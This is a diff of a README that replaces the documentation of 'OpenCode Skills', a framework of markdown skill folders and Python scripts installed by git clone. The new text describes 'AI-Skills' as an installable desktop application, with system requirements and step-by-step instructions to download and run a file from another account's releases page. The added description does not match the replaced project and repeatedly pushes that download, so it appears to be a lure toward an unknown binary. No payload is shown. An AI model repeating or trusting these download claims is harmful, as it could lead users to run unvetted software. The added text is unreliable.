@@ -1,141 +1,58 @@
-# ![OpenCode Skills Logo](assets/logo.svg) OpenCode Skills
+# 🤖 AI-Skills - Enhance Your AI Experience Effortlessly
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Bun](https://img.shields.io/badge/Runtime-Bun-black?logo=bun&logoColor=white)](https://bun.sh)
-[![Python](https://img.shields.io/badge/Scripts-Python-blue?logo=python&logoColor=white)](https://python.org)
-[![OpenCode](https://img.shields.io/badge/Ecosystem-OpenCode-4FD1C5)](https://opencode.ai)
+## 🚀 Getting Started
+Welcome to AI-Skills! This application offers modular skills that enhance AI capabilities. You can optimize your workflows with specialized knowledge and tool integrations. Perfect for users looking to extend their AI interactions with ease.
 
-> **Modular, self-contained "Skills" that extend AI capabilities with specialized knowledge, workflows, and tool integrations.**
+## 📥 Download Now
+[![Download AI-Skills](https://img.shields.io/badge/Download-AI--Skills-brightgreen)](https://github.com/KhaiEr720/AI-Skills/releases)
 
----
+## 📋 Features
+- **Modular Skills**: Customize your AI with specific skills tailored to your needs.
+- **User-Friendly**: Designed with non-technical users in mind.
+- **Tool Integrations**: Seamlessly connect with tools like GitHub Copilot and OpenCode.
+- **Specialized Knowledge**: Access targeted workflows and knowledge bases to enhance your AI interactions.
 
-## 🚀 Overview
+## 📦 System Requirements
+Before you dive in, ensure your system meets the following requirements to run AI-Skills smoothly:
+- **Operating System**: Windows 10, macOS Mojave or later, or a current Linux distribution.
+- **RAM**: At least 4 GB.
+- **Processor**: Dual-core 2.0 GHz or faster.
+- **Disk Space**: Minimum 100 MB of free space.
 
-OpenCode Skills is a framework for building and managing **AI Skills**. A "Skill" is more than just a prompt; it's a packaged unit of procedural knowledge, automation scripts, and reference materials that transform a general-purpose AI into a domain expert.
+## 🔗 Download & Install
+To get started, visit this page to download: [GitHub Releases Page](https://github.com/KhaiEr720/AI-Skills/releases).
 
-While currently optimized for `~/.opencode`, these skills can be dropped into **any project** to provide immediate context and specialized tools to AI agents (like GitHub Copilot, Claude, or custom OpenCode agents).
+1. Click on the link above to go to the releases page.
+2. Find the latest version of AI-Skills.
+3. Download the file appropriate for your operating system.
+4. Open the downloaded file and follow the installation instructions.
+5. Once the installation is complete, launch AI-Skills and begin enhancing your AI experience.
 
----
+## 💡 Using AI-Skills
+AI-Skills is designed to be straightforward:
 
-## 🧠 What are Skills?
+1. **Launch the Application**: After installation, open AI-Skills from your applications menu or desktop shortcut.
+2. **Select Skills**: Choose from the available skills based on what you want to achieve.
+3. **Connect Tools**: Integrate tools like GitHub Copilot and OpenCode for enhanced functionality.
+4. **Begin Your Journey**: Explore the features and benefit from specialized knowledge tailored to your AI needs.
 
-Skills are "onboarding guides" for AI. They provide:
+## ⚙️ Troubleshooting
+If you encounter issues:
 
-1. **Specialized Workflows**: Multi-step procedures for specific domains.
-2. **Tool Integrations**: Instructions for working with specific APIs or file formats.
-3. **Domain Expertise**: Schemas, business logic, and quality standards.
-4. **Bundled Resources**: Scripts for deterministic tasks and assets for output generation.
+- **Installation Problems**: Ensure your system meets the requirements mentioned above.
+- **Running Issues**: Check for updates on the releases page. An update may resolve unexpected behavior.
+- **Feedback & Support**: If problems persist, feel free to report them through the issues section on our GitHub repository.
 
----
+## 💬 Community & Support
+Join our community for additional help and discussions around AI-Skills. Engage with other users to share tips, skills, and enhancements.
 
-## 🏗️ Architecture
+- [GitHub Discussions](https://github.com/KhaiEr720/AI-Skills/discussions)
+- [GitHub Issues](https://github.com/KhaiEr720/AI-Skills/issues)
 
-The following diagram illustrates how agents discover and load skills within the OpenCode ecosystem.
+## 📣 Contribution
+We welcome contributions to make AI-Skills better! If you're interested in helping out, check the guidelines in our repository for how to get started.
 
-```mermaid
-graph TD
-    A[AI Agent] --> B{Skill Discovery}
-    B --> C[.opencode/skill/ - Project Local]
-    B --> D[~/.config/opencode/skill/ - Global]
-    B --> E[.claude/skills/ - Compatibility]
-    
-    subgraph "Skill Anatomy"
-    F[SKILL.md] --- G[Frontmatter: Name/Desc]
-    F --- H[Instructions: Markdown]
-    F --- I[scripts/ - Automation]
-    F --- J[references/ - Docs]
-    F --- K[assets/ - Templates]
-    end
-    
-    C --> F
-    D --> F
-```
+## 📈 Future Updates
+Stay tuned for future enhancements, including new skills and features. Your feedback helps us shape AI-Skills into the best application possible.
 
----
-
-## 🛠️ Getting Started
-
-### 1. Installation
-
-Ensure you have [Bun](https://bun.sh) and [Python](https://python.org) installed.
-
-```bash
-# Clone to your local config or project root
-git clone https://github.com/ssdeanx/AI-Skills.git ~/.opencode
-```
-
-### 2. Creating a New Skill
-
-Use the built-in generator to scaffold a new skill:
-
-```bash
-python skills/skill-creator/scripts/init_skill.py my-new-skill --path skills
-```
-
-### 3. Validation & Packaging
-
-Before sharing or using a skill, validate its structure:
-
-```bash
-python skills/skill-creator/scripts/quick_validate.py skills/my-new-skill
-python skills/skill-creator/scripts/package_skill.py skills/my-new-skill
-```
-
----
-
-## 📂 Project Structure
-
-```bash
-.
-├── .github/                # AI Instructions & Workflows
-├── assets/                 # Project branding & logos
-├── skills/                 # The Skill Library
-│   ├── skill-creator/      # Meta-skill for building skills
-│   ├── icon-generator/     # UE & Web icon automation
-│   ├── web-ui-ux/          # Design & Accessibility guidance
-│   └── ...                 # More specialized skills
-├── package.json            # Bun dependencies
-└── bun.lock                # Lockfile
-```
-
----
-
-## 🔧 Advanced Usage
-
-### Project-Level Integration
-
-To use these skills in a specific project, simply copy the desired skill folder into your project's `.opencode/skill/` directory. AI agents will automatically prioritize these local versions.
-
-### Progressive Disclosure
-
-Skills are designed to be **context-efficient**.
-
-- **Metadata** is always loaded.
-- **SKILL.md** is loaded only when the skill triggers.
-- **References/Scripts** are loaded only when explicitly needed by the agent.
-
----
-
-## 📊 Project Metadata
-
-```yaml
-project:
-  name: OpenCode Skills
-  version: 1.0.0
-  status: active
-  stack: [Bun, Python, Markdown]
-  compatibility: [GitHub Copilot, Claude, OpenCode]
-  license: MIT
-```
-
----
-
-## 🤝 Contributing
-
-We welcome new skills! Please follow the [AGENTS.md](skills/AGENTS.md) guidelines and use the `skill-creator` to ensure compatibility.
-
----
-
-<p align="center">
-  Built with ❤️ for the OpenCode Ecosystem
-</p>
+[![Download AI-Skills](https://img.shields.io/badge/Download-AI--Skills-brightgreen)](https://github.com/KhaiEr720/AI-Skills/releases)
